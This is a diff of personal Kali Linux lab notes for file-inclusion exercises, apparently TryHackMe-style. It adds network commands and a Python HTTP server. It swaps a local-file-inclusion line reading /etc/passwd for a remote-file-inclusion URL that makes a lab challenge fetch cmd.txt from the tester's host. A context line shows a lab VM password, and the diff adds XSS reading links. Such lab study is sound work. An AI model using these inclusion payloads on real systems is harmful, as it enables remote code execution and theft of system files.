@@ -28,6 +28,9 @@ Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 G
 lsb_release -a
 
 cat /etc/os-release 
+
+hostname -I
+ip addr
 ```
 
 <b>Arp Spoofing</b> 
@@ -82,11 +85,13 @@ deactivate
 lsvirtualenv
 
 python -m pip install -r requirements.txt
+
+# start python server
+python3 –m http.server 9001
 ```
 
-
-lab1.php?file=/etc/passwd
-
+http://10.10.109.151/challenges//chall3.php?file=http://10.0.2.4:9001/cmd.txt
+10.0.2.4 10.8.17.39 
 
 ## Reference
 
@@ -101,4 +106,7 @@ Password Windows VM Machine: Passw0rd!
 [Debian Release](https://www.debian.org/releases/)  
 [File Inclusion, LFI and RFI](https://medium.com/@kumarishefu.4507/try-hack-me-write-up-module-vulnerability-research-file-inclusion-aaa898210bc5)
 [RequestBin](https://requestbin.com/)  
-
+[XSS](http://google-gruyere.appspot.com/)  
+[XSS Attacks](https://www.oreilly.com/library/view/xss-attacks/9780080553405/)  
+[The Tangled Web](https://lcamtuf.coredump.cx/tangled/)
+[Practical Doomsday](https://lcamtuf.coredump.cx/prep/)
